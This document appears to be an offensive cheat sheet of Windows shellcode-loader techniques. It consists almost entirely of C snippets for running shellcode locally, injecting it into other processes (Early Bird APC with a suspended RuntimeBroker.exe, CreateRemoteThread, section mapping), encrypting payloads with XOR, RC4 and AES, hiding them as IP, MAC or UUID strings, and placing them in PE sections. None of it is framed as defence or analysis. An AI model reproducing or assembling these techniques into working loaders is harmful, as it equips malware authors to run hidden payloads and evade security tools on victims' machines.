# Shellcode Loading & Execution Techniques

## Local Execution Methods

### VirtualAlloc + CreateThread
```c
LPVOID p = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
memcpy(p, shellcode, size);
DWORD old;
VirtualProtect(p, size, PAGE_EXECUTE_READ, &old);
HANDLE h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)p, NULL, 0, NULL);
WaitForSingleObject(h, INFINITE);
```

### Fiber Execution (no thread creation)
```c
PVOID mainFiber = ConvertThreadToFiber(NULL);
PVOID scFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)pShellcode, NULL);
SwitchToFiber(scFiber);
```

### Callback Execution (no CreateThread)
```c
EnumChildWindows(NULL, (WNDENUMPROC)pShellcode, 0);
CreateTimerQueueTimer(&hTimer, hQueue, (WAITORTIMERCALLBACK)pShellcode, NULL, 0, 0, WT_EXECUTEINTIMERTHREAD);
```

### APC Self-Injection (NtTestAlert)
```c
QueueUserAPC((PAPCFUNC)pShellcode, GetCurrentThread(), 0);
typedef NTSTATUS(NTAPI* fnNtTestAlert)();
fnNtTestAlert pNtTestAlert = (fnNtTestAlert)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTestAlert");
pNtTestAlert();
```

## Remote Injection Methods

### Early Bird APC Injection
```c
CreateProcessA(NULL, "C:\\Windows\\System32\\RuntimeBroker.exe",
    NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
LPVOID r = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, r, shellcode, size, NULL);
QueueUserAPC((PAPCFUNC)r, pi.hThread, 0);
ResumeThread(pi.hThread);
```

### Classic Remote Injection
```c
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
LPVOID r = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProc, r, shellcode, size, NULL);
CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)r, NULL, 0, NULL);
```

### Mapping Injection (NtCreateSection)
```c
HANDLE hSection;
LARGE_INTEGER li; li.QuadPart = size;
NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &li, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
PVOID pRW = NULL; SIZE_T vSize = 0;
NtMapViewOfSection(hSection, GetCurrentProcess(), &pRW, 0, 0, NULL, &vSize, 2, 0, PAGE_READWRITE);
memcpy(pRW, shellcode, size);
NtUnmapViewOfSection(GetCurrentProcess(), pRW);
PVOID pRX = NULL; vSize = 0;
NtMapViewOfSection(hSection, GetCurrentProcess(), &pRX, 0, 0, NULL, &vSize, 2, 0, PAGE_EXECUTE_READ);
CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pRX, NULL, 0, NULL);
```

## Payload Encryption

### XOR with Random Key
```c
void XorCrypt(PBYTE data, DWORD size, PBYTE key, DWORD keyLen) {
    for (DWORD i = 0; i < size; i++) data[i] ^= key[i % keyLen];
}
```

### RC4
```c
typedef struct { BYTE S[256]; int i, j; } RC4_ST;
void Rc4Init(RC4_ST* s, PBYTE k, DWORD kl) {
    for (int i=0;i<256;i++) s->S[i]=(BYTE)i;
    int j=0;
    for (int i=0;i<256;i++) {
        j=(j+s->S[i]+k[i%kl])%256;
        BYTE t=s->S[i]; s->S[i]=s->S[j]; s->S[j]=t;
    }
    s->i=s->j=0;
}
void Rc4Crypt(RC4_ST* s, PBYTE d, DWORD l) {
    for (DWORD n=0;n<l;n++) {
        s->i=(s->i+1)%256; s->j=(s->j+s->S[s->i])%256;
        BYTE t=s->S[s->i]; s->S[s->i]=s->S[s->j]; s->S[s->j]=t;
        d[n]^=s->S[(s->S[s->i]+s->S[s->j])%256];
    }
}
```

### AES via BCrypt
```c
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")
BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pKey, 32, 0);
BCryptDecrypt(hKey, pCipherText, dwSize, NULL, pIv, 16, pPlainText, dwPlainSize, &dwResult, BCRYPT_BLOCK_PADDING);
```

## Payload Obfuscation Formats
- **IPv4Fuscation**: 4 bytes → "252.72.131.228", decode with RtlIpv4StringToAddressA
- **IPv6Fuscation**: 16 bytes per address, decode with RtlIpv6StringToAddressA
- **MACFuscation**: 6 bytes → "FC-48-83-E4-F0-E8", decode with RtlEthernetStringToAddressA
- **UUIDFuscation**: 16 bytes per UUID, decode with UuidFromStringA

## Payload Placement
- `.data` section: `unsigned char payload[] = {...};` (global)
- `.text` section: `#pragma section(".text")` + `__declspec(allocate(".text"))`
- `.rsrc` section: embed via .rc resource file, extract with FindResource/LoadResource/LockResource
